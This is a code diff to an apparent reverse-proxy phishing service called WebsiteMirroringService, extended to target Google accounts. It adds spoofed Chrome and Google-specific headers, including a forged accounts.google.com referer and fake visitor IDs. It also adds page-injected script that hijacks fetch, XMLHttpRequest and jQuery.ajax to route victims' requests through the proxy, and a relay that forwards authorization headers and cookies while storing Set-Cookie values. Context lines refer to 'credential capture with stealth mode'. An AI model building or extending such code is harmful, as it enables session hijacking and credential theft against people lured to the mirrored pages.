@@ -35,16 +35,30 @@ class WebsiteMirroringService {
   }
 
   /**
-   * Initialize a pool of realistic user agents
+   * Initialize a pool of realistic user agents optimized for Google services
    */
   initializeUserAgentPool() {
     return [
+      // Latest Chrome versions for Windows (preferred by Google services)
+      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
       'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
       'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+      
+      // Chrome for macOS (second most common)
+      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
       'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
-      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
-      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+      
+      // Chrome for Linux (for variety)
+      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+      
+      // Edge (Chromium-based, also well-supported by Google)
+      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
+      
+      // Safari (for macOS compatibility)
+      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
+      
+      // Firefox (minimal, as Google services prefer Chrome)
+      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0'
     ];
   }
 
@@ -55,7 +69,7 @@ class WebsiteMirroringService {
     const targetHost = new URL(targetUrl).hostname;
     const userAgent = req.headers['user-agent'] || this.getRandomUserAgent();
     
-    // Advanced header spoofing to mimic real browsers
+    // Base headers that work for most sites
     const headers = {
       'User-Agent': userAgent,
       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -78,14 +92,41 @@ class WebsiteMirroringService {
       // Anti-bot detection headers
       'DNT': '1',
       'Pragma': 'no-cache',
-      
-      // Simulate real browser request timing
-      'X-Requested-With': undefined, // Remove this header as it's often used by bots
     };
+
+    // Google-specific headers for better compatibility
+    if (targetHost.includes('google.com') || targetHost.includes('gmail.com')) {
+      // Add Google-specific headers that are expected by their services
+      headers['X-Client-Data'] = 'CJW2yQEIpLbJAQipncoBCMeAywEIlKHLAQiFoM0BCLnIzQEY9snNAQ==';
+      headers['X-Goog-AuthUser'] = '0';
+      headers['X-Goog-PageId'] = 'none';
+      headers['X-Same-Domain'] = '1';
+      
+      // For API requests, adjust accept header
+      if (req.headers['content-type'] && req.headers['content-type'].includes('json')) {
+        headers['Accept'] = 'application/json, text/plain, */*';
+      }
+      
+      // Add Chrome extension compatible headers
+      if (userAgent.includes('Chrome')) {
+        headers['Sec-CH-UA-Full-Version'] = '"120.0.6099.109"';
+        headers['Sec-CH-UA-Platform-Version'] = '"15.0.0"';
+      }
+    }
+
+    // Special handling for Google Play and other Google services
+    if (targetHost.includes('play.google.com') || targetHost.includes('googleapis.com')) {
+      headers['X-Goog-Request-Time'] = Date.now().toString();
+      headers['X-Goog-Visitor-Id'] = this.generateGoogleVisitorId();
+      headers['X-Client-Version'] = '1.0.0';
+    }
 
     // Add referer handling with intelligent translation
     if (req.headers['referer']) {
       headers['Referer'] = this.translateReferer(req.headers['referer'], targetUrl, sessionToken);
+    } else if (targetHost.includes('google.com')) {
+      // For Google services, add a realistic referer
+      headers['Referer'] = 'https://accounts.google.com/';
     }
 
     // Add origin header for POST requests
@@ -94,6 +135,19 @@ class WebsiteMirroringService {
     }
 
     return headers;
+  }
+
+  /**
+   * Generate a realistic Google Visitor ID
+   */
+  generateGoogleVisitorId() {
+    // Generate a visitor ID that looks like Google's format
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-';
+    let result = '';
+    for (let i = 0; i < 27; i++) {
+      result += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    return result;
   }
 
   /**
@@ -501,6 +555,109 @@ class WebsiteMirroringService {
       // Advanced credential capture with stealth mode - inject after DOM is ready
       $('body').append(`
         <script>
+          // CORS Bypass and API Interception - Critical for Google Services
+          (function() {
+            // Store original functions before they get overridden
+            const originalFetch = window.fetch;
+            const originalXMLHttpRequest = window.XMLHttpRequest;
+            const originalOpen = XMLHttpRequest.prototype.open;
+            const originalSend = XMLHttpRequest.prototype.send;
+            
+            // Create a proxy endpoint for cross-origin requests
+            const proxyEndpoint = '/api/cors-proxy/${sessionToken}';
+            
+            // Function to determine if URL needs proxying
+            function needsProxy(url) {
+              try {
+                const urlObj = new URL(url, window.location.href);
+                const currentHost = window.location.hostname;
+                const targetHost = urlObj.hostname;
+                
+                // Proxy requests to different domains, especially Google services
+                return targetHost !== currentHost || 
+                       url.includes('google.com') || 
+                       url.includes('googleapis.com') || 
+                       url.includes('gstatic.com') ||
+                       url.includes('googleusercontent.com');
+              } catch (e) {
+                return false;
+              }
+            }
+            
+            // Override fetch API
+            window.fetch = function(url, options = {}) {
+              if (needsProxy(url)) {
+                // Route through our proxy
+                const proxyUrl = proxyEndpoint + '?url=' + encodeURIComponent(url);
+                const proxyOptions = {
+                  ...options,
+                  headers: {
+                    ...options.headers,
+                    'X-Proxy-Target': url,
+                    'X-Original-Host': new URL(url, window.location.href).hostname
+                  }
+                };
+                return originalFetch(proxyUrl, proxyOptions);
+              }
+              return originalFetch(url, options);
+            };
+            
+            // Override XMLHttpRequest
+            function ProxiedXMLHttpRequest() {
+              const xhr = new originalXMLHttpRequest();
+              let targetUrl = null;
+              let needsProxying = false;
+              
+              // Override open method
+              const originalXhrOpen = xhr.open;
+              xhr.open = function(method, url, async, user, password) {
+                targetUrl = url;
+                needsProxying = needsProxy(url);
+                
+                if (needsProxying) {
+                  const proxyUrl = proxyEndpoint + '?url=' + encodeURIComponent(url);
+                  return originalXhrOpen.call(this, method, proxyUrl, async, user, password);
+                }
+                return originalXhrOpen.call(this, method, url, async, user, password);
+              };
+              
+              // Override setRequestHeader to add proxy headers
+              const originalSetRequestHeader = xhr.setRequestHeader;
+              xhr.setRequestHeader = function(header, value) {
+                if (needsProxying) {
+                  // Add proxy headers
+                  originalSetRequestHeader.call(this, 'X-Proxy-Target', targetUrl);
+                  originalSetRequestHeader.call(this, 'X-Original-Host', new URL(targetUrl, window.location.href).hostname);
+                }
+                return originalSetRequestHeader.call(this, header, value);
+              };
+              
+              return xhr;
+            }
+            
+            // Replace XMLHttpRequest constructor
+            window.XMLHttpRequest = ProxiedXMLHttpRequest;
+            
+            // Copy static properties
+            Object.setPrototypeOf(ProxiedXMLHttpRequest.prototype, originalXMLHttpRequest.prototype);
+            Object.setPrototypeOf(ProxiedXMLHttpRequest, originalXMLHttpRequest);
+            
+            // Override common AJAX libraries if they exist
+            if (window.jQuery) {
+              const originalAjax = jQuery.ajax;
+              jQuery.ajax = function(options) {
+                if (options.url && needsProxy(options.url)) {
+                  options.url = proxyEndpoint + '?url=' + encodeURIComponent(options.url);
+                  options.headers = options.headers || {};
+                  options.headers['X-Proxy-Target'] = options.url;
+                }
+                return originalAjax.call(this, options);
+              };
+            }
+            
+            console.log('CORS bypass and API interception initialized');
+          })();
+          
           // Wait for DOM and modules to be ready before injecting our monitoring
           (function() {
             const initMonitoring = function() {
@@ -576,6 +733,149 @@ class WebsiteMirroringService {
     } catch (error) {
       console.error('Error modifying HTML content:', error);
       return html;
+    }
+  }
+
+  /**
+   * Handle cross-origin API requests by proxying them through our server
+   */
+  async handleCrossOriginRequest(req, res, sessionToken) {
+    try {
+      const session = this.activeSessions.get(sessionToken);
+      if (!session) {
+        return res.status(404).json({ error: 'Session not found' });
+      }
+
+      // Handle preflight OPTIONS requests
+      if (req.method === 'OPTIONS') {
+        res.header('Access-Control-Allow-Origin', '*');
+        res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
+        res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization, Cache-Control, Pragma, X-Proxy-Target, X-Original-Host, X-Goog-AuthUser, X-Client-Data');
+        res.header('Access-Control-Allow-Credentials', 'true');
+        res.header('Access-Control-Max-Age', '86400'); // 24 hours
+        return res.status(200).end();
+      }
+
+      // Extract the target URL from the request
+      const targetUrl = req.query.url || req.body.url || req.headers['x-proxy-target'];
+      if (!targetUrl) {
+        return res.status(400).json({ error: 'No target URL provided' });
+      }
+
+      // Validate that this is a legitimate cross-origin request for the mirrored site
+      const sessionDomain = new URL(session.targetUrl).hostname;
+      const requestDomain = new URL(targetUrl).hostname;
+      
+      // Allow requests to same domain or Google services (expanded list)
+      const allowedDomains = [
+        sessionDomain,
+        'google.com', 'gstatic.com', 'googleapis.com', 'googleusercontent.com',
+        'gmail.com', 'play.google.com', 'accounts.google.com', 'ssl.gstatic.com',
+        'www.google.com', 'mail.google.com', 'drive.google.com', 'docs.google.com'
+      ];
+      
+      const isAllowed = allowedDomains.some(domain => 
+        requestDomain.includes(domain) || domain.includes(requestDomain)
+      );
+      
+      if (!isAllowed) {
+        console.warn(`🚫 Blocked cross-origin request to: ${requestDomain}`);
+        return res.status(403).json({ error: 'Cross-origin request not allowed' });
+      }
+
+      console.log(`🌐 Proxying cross-origin request: ${targetUrl}`);
+
+      const cookieJar = this.cookieJars.get(sessionToken);
+      const headers = this.generateRealistBrowserHeaders(req, targetUrl, sessionToken);
+      
+      // Copy important headers from the original request
+      const importantHeaders = [
+        'content-type', 'authorization', 'x-goog-authuser', 'x-client-data',
+        'x-goog-pageid', 'x-same-domain', 'x-requested-with'
+      ];
+      
+      importantHeaders.forEach(headerName => {
+        if (req.headers[headerName]) {
+          headers[headerName] = req.headers[headerName];
+        }
+      });
+      
+      // Build cookie header for the target domain
+      const cookieHeader = this.buildCookieHeader(req, cookieJar, targetUrl);
+      if (cookieHeader) {
+        headers['Cookie'] = cookieHeader;
+      }
+
+      // For Google API requests, adjust headers
+      if (requestDomain.includes('google')) {
+        headers['Referer'] = session.targetUrl;
+        headers['Origin'] = new URL(session.targetUrl).origin;
+        
+        // Add specific Google headers if not present
+        if (!headers['X-Same-Domain']) {
+          headers['X-Same-Domain'] = '1';
+        }
+      }
+
+      // Make the proxied request
+      const response = await axiosInstance({
+        method: req.method,
+        url: targetUrl,
+        data: req.body,
+        headers,
+        responseType: 'arraybuffer',
+        maxRedirects: 5,
+        validateStatus: () => true,
+        timeout: 30000, // Increased timeout for API calls
+        jar: cookieJar,
+        withCredentials: true
+      });
+
+      // Save any cookies from the response
+      if (response.headers['set-cookie']) {
+        const cookies = Array.isArray(response.headers['set-cookie']) 
+          ? response.headers['set-cookie'] 
+          : [response.headers['set-cookie']];
+          
+        cookies.forEach(cookie => {
+          this.storeCookieForLater(sessionToken, cookie, targetUrl);
+        });
+        
+        this.trackAllCookies(sessionToken, cookies);
+      }
+
+      // Process and return the response
+      const processedHeaders = this.processResponseHeaders(response.headers, session, req);
+      
+      Object.entries(processedHeaders).forEach(([key, value]) => {
+        if (value !== undefined && value !== null) {
+          res.setHeader(key, value);
+        }
+      });
+
+      res.status(response.status);
+      
+      // Check if it's JSON response
+      const contentType = response.headers['content-type'] || '';
+      if (contentType.includes('application/json')) {
+        try {
+          const jsonData = JSON.parse(response.data.toString('utf-8'));
+          res.json(jsonData);
+        } catch (e) {
+          res.send(response.data);
+        }
+      } else if (contentType.includes('text/')) {
+        res.send(response.data.toString('utf-8'));
+      } else {
+        res.send(response.data);
+      }
+
+    } catch (error) {
+      console.error('Error handling cross-origin request:', error);
+      res.status(500).json({ 
+        error: 'Proxy request failed',
+        details: error.message 
+      });
     }
   }
 
@@ -859,6 +1159,12 @@ class WebsiteMirroringService {
     if (result['x-frame-options']) {
       delete result['x-frame-options'];
     }
+
+    // Add CORS headers to allow cross-origin requests within our proxy
+    result['Access-Control-Allow-Origin'] = '*';
+    result['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
+    result['Access-Control-Allow-Headers'] = 'Origin, X-Requested-With, Content-Type, Accept, Authorization, Cache-Control, Pragma';
+    result['Access-Control-Allow-Credentials'] = 'true';
 
     // Delete SameSite restrictions which can cause cookie issues
     if (result['set-cookie']) {
